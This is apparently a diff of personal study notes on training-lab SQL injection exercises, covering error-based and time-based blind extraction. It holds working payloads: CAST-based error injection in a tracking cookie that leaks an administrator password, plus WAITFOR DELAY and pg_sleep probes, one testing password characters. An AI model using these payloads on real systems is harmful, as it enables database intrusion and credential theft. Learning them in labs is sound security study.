@@ -496,7 +496,7 @@ the same concept; now if the name != admi.. -> implies a else 1/0 error conditio
 
 lab;
 
-  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
 The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
 
@@ -516,8 +516,79 @@ analysis;
  pause for now.
  
  
+ Extracting sensitive data via verbose SQL error messages;
+ 	- which means add some extra queries to extract the data from the database.
+ Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char 
+ this error may happened as you tried to enter a 3 quotes at a  time which is error 
  
+ CAST((SELECT example_column FROM example_table) AS int)
+ ERROR: invalid input syntax for type integer: "Example data"
+ as you see;this generate an error  as you can't convert  the entries inside that column into int datatype.
  
+ lab;
+  This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+
+The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 
+
+analysis;
+	- using traking cookie for analytics.
+	- table-> users -> username,password 
+	- leak the password for 'administrator'
+	
+solution;
+'and cast(( select  1 )as  int)--;
+this generate an  error says the returned value!=int
+so to repair that
+ 'and 1=cast(( select  1 )as  int)--
+ we  put the string that returned from backend as 1 to be equal to int
+ now let's leak the password,username
+ and 1=cast(( select username from users )as  int)--
+ this generate an error 
+ 
+ Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'E6Cf8xP0I2UpxKoJ'and 1=cast(( select username from users )as'. Expected  char
+ 
+ now remove the string value of the traking id to free up some space to send the characters
+ send again 
+  TrackingId=' and 1=cast(( select username from users )as  int)--
+ ERROR: more than one row returned by a subquery used as an expression
+ now we know that backend retrun a values but it didn't match 1 so we need to limit our return values from db
+: TrackingId='and 1=cast(( select username from users limit 1 )as  int)--
+ output is an error 
+ ERROR: invalid input syntax for type integer: "administrator"
+ now change this value to be password 
+ TrackingId='and 1=cast(( select password from users limit 1 )as  int)--
+ 
+ output is an error contain this;nga4zl6lfl65rtr7dffh
+ now register using password 
+ 
+done. 
+ 
+  ---
+EXploiting blind sql injection by triggering time delays;
+ 
+ we measure the behaviour of db by seeing the whether the sql will do delays in it or not ->  if it makes delays -> that means our injected idea are correct if  no -> our injecting query is false.
+ 
+ '; IF (1=2) WAITFOR DELAY '0:0:10'--  
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+ 
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+as you see this is used to delay a  query from executation in order to avoide the 
+lab;
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
+ analysis;
+ 	- focus on traking cookie 
+ 	- result of sql query arn't returned
+ 	- app doesn't respond whether the query return (rows|error)
+ 	- possible to trigger conditional time delays.
+ 	
+solution
+' || pg_sleep(10)--
+this will pause the database for  10 seconds (solution) why we used pg_sleep(10) -> that means that we inside postgresql as it works
+if  you hacked another thing -> you   just see how to sleep it with different database commands untill you see the output is paused.
  
  
  
@@ -547,7 +618,7 @@ Note
 To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
 analysis;
 	- blind sql injection vulnerability
-	-traking cookie
+	- traking cookie
 	- out-of-band with external domain
 	- table=> users->columns username,password
 	- use the blind sql to exploit the pass of administrator.
@@ -597,7 +668,7 @@ PreparedStatement statement = connection.prepareStatement("SELECT * FROM product
 statement.setString(1, input);
 ResultSet resultSet = statement.executeQuery();  
 
-
+   
 
 
 
